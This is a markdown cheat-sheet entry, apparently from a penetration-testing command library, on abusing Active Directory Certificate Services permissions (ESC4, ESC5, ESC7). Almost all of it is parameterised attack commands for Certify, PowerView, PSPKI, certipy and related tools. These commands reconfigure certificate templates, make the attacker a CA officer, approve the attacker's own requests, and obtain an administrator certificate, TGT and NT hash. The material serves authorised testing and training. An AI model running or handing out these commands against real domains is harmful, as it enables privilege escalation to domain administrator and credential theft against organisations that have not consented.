---
technique: ADCS Access Control Abuse
category: adcs
ace: GenericAll, GenericWrite, WriteDacl, WriteOwner, ManageCA, ManageCertificates
targets: Certificate Template, Certificate Authority, PKI Objects
protocols: LDAP, RPC
remote_capable: true
tags: adcs esc dacl acl-abuse pki privesc
---

# ADCS Access Control Abuse

Permissive ACEs over AD CS objects, certificate templates (ESC4), the CA itself (ESC7), and surrounding PKI objects (ESC5), allow attackers to modify template settings, approve certificate requests, or take over PKI infrastructure to escalate privileges.

## Required Rights

| ESC | Object | Right Needed |
|-----|--------|--------------|
| ESC4 | Certificate Template | GenericAll, GenericWrite, WriteDacl, WriteOwner |
| ESC5 | PKI AD Objects (NTAuthCertificates, CA computer, etc.) | Any permissive ACE |
| ESC7 | Certificate Authority | ManageCA, ManageCertificates |

## Windows

### Certify: enumerate template ACEs (ESC4)

#powershell #certify #enum

Enumerate certificate templates to find sensitive ACEs that allow template modification.

```powershell title:"ESC4: enumerate templates for sensitive ACEs with Certify"
.\Certify.exe find
```
<!-- cheat
import domain_ip
import users
-->

### PowerView: Step 1: enable enrollee-supplied SAN (ESC4)

#powershell #powerview #template-write

Enable the enrollee-supplied SAN flag on the template.

```powershell title:"ESC4: XOR mspki-enrollment-flag to enable enrollee-supplied SAN"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -XOR @{'mspki-enrollment-flag'=2} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

### PowerView: Step 2: clear RA signature requirement (ESC4)

#powershell #powerview #template-write

Clear the RA signature requirement on the template so no enrollment agent approval is needed.

```powershell title:"ESC4: set mspki-ra-signature to 0"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -Set @{'mspki-ra-signature'=0} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

### PowerView: Step 3: enable arbitrary subject name flag (ESC4)

#powershell #powerview #template-write

Enable the certificate name flag that allows the requester to supply an arbitrary subject name.

```powershell title:"ESC4: XOR mspki-certificate-name-flag to allow arbitrary subject"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -XOR @{'mspki-certificate-name-flag'=1} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

### PowerView: Step 4: set client auth application policy (ESC4)

#powershell #powerview #template-write

Set the application policy on the template to Client Authentication so the cert can be used for PKINIT.

```powershell title:"ESC4: set mspki-certificate-application-policy to Client Auth OID"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

### Certify: Step 5: request cert with admin SAN (ESC4)

#powershell #certify #san

Request a cert with administrator in the SAN against the now-vulnerable template.

```powershell title:"ESC4: request cert with administrator SAN via Certify"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"administrator"
```
<!-- cheat
import domain_ip
import users
var template_name
var ca_name
-->

### PowerView: grant enrollment rights on template

#powershell #powerview #dacl #enrollment

Grant Certificate-Enrollment rights to a controlled object over a template when WriteDacl is held over the template.

```powershell title:"Grant Certificate-Enrollment rights to controlled object over template"
Add-DomainObjectAcl -TargetIdentity "$template_name" -PrincipalIdentity "$controlled_object" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=$dc_base" -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
var controlled_object
var dc_base
-->

### Certify: enumerate CAs for ESC7 (ESC7)

#powershell #certify #enum #manage-ca

Enumerate CAs to identify ManageCA or ManageCertificates rights on a controlled principal.

```powershell title:"ESC7: enumerate CAs to find ManageCA rights with Certify"
.\Certify.exe cas
```
<!-- cheat
import domain_ip
import users
-->

### PSPKI: Step 1: install PSPKI (ESC7)

#powershell #pspki #manage-ca #manage-certificates

Install the PSPKI module for CA officer operations.

```powershell title:"ESC7: install PSPKI"
Install-Module -Name PSPKI
```
<!-- cheat
import domain_ip
import users
-->

### PSPKI: Step 2: import PSPKI (ESC7)

#powershell #pspki #manage-ca #manage-certificates

Import the PSPKI module for CA officer operations.

```powershell title:"ESC7: import PSPKI"
Import-Module PSPKI
```
<!-- cheat
import domain_ip
import users
-->

### PSPKI: Step 3: approve pending cert request (ESC7)

#powershell #pspki #manage-certificates

Approve the pending certificate request as a CA officer to bypass manager approval.

```powershell title:"ESC7: approve pending cert request as CA officer"
Get-CertificationAuthority -ComputerName "$ca_fqdn" | Get-PendingRequest -RequestID $request_id | Approve-CertificateRequest
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
var request_id
-->

### Certify: Step 3: download issued cert (ESC7)

#powershell #certify #manage-certificates

Download the issued certificate using the approved request ID.

```powershell title:"ESC7: download issued cert by request ID"
.\Certify.exe download /ca:"$ca_fqdn\$ca_name" /id:$request_id
```
<!-- cheat
import domain_ip
import users
var ca_fqdn
var ca_name
var request_id
-->

## Linux

### certipy: Step 1: save old template config then write vulnerable config (ESC4)

#certipy #template-write

Save old template config and push default vulnerable configuration to enable enrollee-supplied SAN and disable approval.

```sh title:"ESC4: save old config and write default vulnerable configuration"
certipy template -u $user@$domain $auth_flags -dc-ip $rhost_ip -template $template_name -write-default-configuration
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var template_name
-->

### certipy: Step 2: request cert with admin UPN (ESC4)

#certipy #template-write #san

Request a cert with the admin UPN against the modified template.

```sh title:"ESC4: request cert with admin UPN against modified template"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### certipy: Step 3: restore original template config (ESC4)

#certipy #template-write

Restore the original template configuration from the saved JSON backup.

```sh title:"ESC4: restore original template config from saved JSON"
certipy template -u $user@$domain $auth_flags -dc-ip $rhost_ip -template $template_name -write-configuration $template_name.json -no-save
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var template_name
-->

### certipy: Step 4: PKINIT as administrator (ESC4)

#certipy #pkinit

Authenticate with PKINIT using the issued cert to get the administrator TGT and NT hash.

```sh title:"ESC4: PKINIT with administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### modifyCertTemplate: Step 1: set enrollment flag (ESC4)

#python #modify-cert-template #template-write

Set mspki-enrollment-flag to enable enrollee-supplied SAN via modifyCertTemplate.

```sh title:"ESC4: set mspki-enrollment-flag via modifyCertTemplate"
modifyCertTemplate.py -template $template_name -value 2 -property mspki-enrollment-flag "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var template_name
-->

### modifyCertTemplate: Step 2: clear RA signature requirement (ESC4)

#python #modify-cert-template #template-write

Clear the RA signature requirement on the template.

```sh title:"ESC4: set mspki-ra-signature to 0 via modifyCertTemplate"
modifyCertTemplate.py -template $template_name -value 0 -property mspki-ra-signature "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var template_name
-->

### modifyCertTemplate: Step 3: add enrollee-supplies-subject flag (ESC4)

#python #modify-cert-template #template-write

Add the enrollee_supplies_subject flag to msPKI-Certificate-Name-Flag.

```sh title:"ESC4: add enrollee_supplies_subject to msPKI-Certificate-Name-Flag"
modifyCertTemplate.py -template $template_name -add enrollee_supplies_subject -property "msPKI-Certificate-Name-Flag" "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var template_name
-->

### modifyCertTemplate: Step 4: set client auth EKU (ESC4)

#python #modify-cert-template #template-write

Set the pKIExtendedKeyUsage to Client Authentication and PKINIT EKU OIDs.

```sh title:"ESC4: set pKIExtendedKeyUsage to client auth OIDs"
modifyCertTemplate.py -template $template_name -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'" -property "pKIExtendedKeyUsage" "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var template_name
-->

### certipy: Step 1: add self as CA officer (ESC7)

#certipy #manage-ca #manage-certificates #subca

Grant self officer role (ManageCertificates) on the CA using existing ManageCA rights.

```sh title:"ESC7: add self as officer on the CA"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -add-officer $user
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### certipy: Step 2: enable SubCA template (ESC7)

#certipy #manage-ca #subca

Enable the SubCA template on the CA so a pending request can be submitted.

```sh title:"ESC7: enable SubCA template on the CA"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -enable-template SubCA
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### certipy: Step 3: submit pending request with admin UPN (ESC7)

#certipy #manage-ca #subca

Submit a cert request with admin UPN against SubCA; it will pend and return a request ID.

```sh title:"ESC7: submit SubCA request with admin UPN (will pend)"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template SubCA -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### certipy: Step 4: approve pending request (ESC7)

#certipy #manage-certificates #subca

Approve the pending request as CA officer.

```sh title:"ESC7: approve own pending request as CA officer"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -issue-request $request_id
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var request_id
-->

### certipy: Step 5: retrieve issued cert (ESC7)

#certipy #manage-ca #subca

Retrieve the issued certificate by request ID.

```sh title:"ESC7: retrieve issued cert by request ID"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -retrieve $request_id
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var request_id
-->

### certipy: Step 6: PKINIT as administrator (ESC7)

#certipy #pkinit

Authenticate with PKINIT using the retrieved cert to get the administrator TGT and NT hash.

```sh title:"ESC7: PKINIT with retrieved administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### dacledit.py: read PKI object ACEs (ESC5)

#impacket #dacl #pki-objects

Read DACL on PKI-related AD objects to find permissive ACEs that enable ESC5 escalation paths.

```sh title:"ESC5: read DACL on PKI AD objects to find permissive ACEs"
dacledit.py -action 'read' -principal "$controlled_object" -target "$target_object" "$domain"/"$user":"$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
var controlled_object
var target_object
-->
